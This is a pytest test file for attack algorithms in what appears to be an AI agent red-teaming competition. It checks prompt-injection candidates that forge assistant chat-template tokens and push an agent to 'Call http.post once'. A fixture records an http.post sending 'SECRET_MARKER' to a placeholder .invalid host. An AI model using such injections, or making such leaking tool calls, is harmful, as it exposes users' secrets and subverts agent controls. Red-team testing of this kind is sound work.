"""Contract tests for the B013 replay-safe chain4 candidate."""

import importlib.util
import re
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B013_ATTACK_PATH = Path("baselines/replaysafe_chain4_v1/attack.py")
URL_RE = re.compile(r"https?://[^\s,]+")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig

    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig

    core = types.ModuleType("aicomp_sdk.core")
    sdk = types.ModuleType("aicomp_sdk")

    monkeypatch.setitem(sys.modules, "aicomp_sdk", sdk)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", core)


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {
                        "url": "http://fixture.invalid",
                        "data": "SECRET_MARKER",
                    },
                }
            ]
        }


def _urls(text: str) -> list[str]:
    return [url.rstrip(".") for url in URL_RE.findall(text)]


def test_b013_only_changes_slow_row_replay_packaging() -> None:
    b008 = _load_attack(B008_ATTACK_PATH, "replaysafe_classify5_attack_for_chain4_compare")
    b013 = _load_attack(B013_ATTACK_PATH, "replaysafe_chain4_attack_constants")

    assert b013.SPLIT_CLASSIFY_N == b008.SPLIT_CLASSIFY_N == 5
    assert b013.SPLIT_THRESHOLD_S == b008.SPLIT_THRESHOLD_S == 12.0
    assert b013.REPLAY_SAFE_FRAC == b008.REPLAY_SAFE_FRAC == 0.99
    assert b013.SLOW_MULTIPOST_N == b008.SLOW_MULTIPOST_N == 4
    assert b013.PROBE_HOPS == b008.PROBE_HOPS == 0
    assert b013.BURST_K == b008.BURST_K == 1
    assert b013.TEMPLATE == b008.TEMPLATE
    assert b013.FRAME_TEMPLATE == b008.FRAME_TEMPLATE
    assert b013._forge_plan_message(7, 4) == b008._forge_plan_message(7, 4)
    assert b013._chain_messages(7, 4) == tuple(b008._message(7 * 4 + i) for i in range(4))


def test_slow_row_candidates_are_chain4_without_changing_live_probe(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    b008 = _load_attack(B008_ATTACK_PATH, "replaysafe_classify5_attack_for_chain4_count")
    b013 = _load_attack(B013_ATTACK_PATH, "replaysafe_chain4_attack_count")

    b008_clock = FakeClock()
    monkeypatch.setattr(b008.time, "monotonic", b008_clock)
    b008_env = FiringEnv(b008_clock, latency_s=13.0)
    b008_candidates = b008.AttackAlgorithm().run(
        b008_env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    b013_clock = FakeClock()
    monkeypatch.setattr(b013.time, "monotonic", b013_clock)
    b013_env = FiringEnv(b013_clock, latency_s=13.0)
    b013_candidates = b013.AttackAlgorithm().run(
        b013_env,
        FakeConfig(time_budget_s=500.0, max_tool_hops=8),
    )

    assert len(b013_candidates) == len(b008_candidates)
    assert set(b013_env.hops) == {8}
    assert any("<|start|>assistant<|channel|>analysis" in msg for msg in b013_env.messages)

    b008_slow_candidates = [
        candidate
        for candidate in b008_candidates
        if "<|start|>assistant<|channel|>analysis" in candidate.user_messages[0]
    ]
    b013_slow_candidates = [
        candidate for candidate in b013_candidates if len(candidate.user_messages) == 4
    ]

    assert b008_slow_candidates
    assert len(b013_slow_candidates) == len(b008_slow_candidates)

    b008_first_urls = _urls(b008_slow_candidates[0].user_messages[0])
    b013_first_urls = [_urls(message)[0] for message in b013_slow_candidates[0].user_messages]
    assert b013_first_urls == b008_first_urls
    assert all(url.endswith(".invalid") for url in b013_first_urls)
    assert all("Call http.post once" in msg for msg in b013_slow_candidates[0].user_messages)
    assert all("<|start|>assistant" not in msg for msg in b013_slow_candidates[0].user_messages)


def test_structure_only_path_remains_b008_compatible() -> None:
    b013 = _load_attack(B013_ATTACK_PATH, "replaysafe_chain4_attack_fallback")

    candidates = b013.AttackAlgorithm().run(None, None)

    assert len(candidates) == b013.FALLBACK_N
    assert all(len(candidate.user_messages) == 1 for candidate in candidates)
    assert all(".invalid" in candidate.user_messages[0] for candidate in candidates)
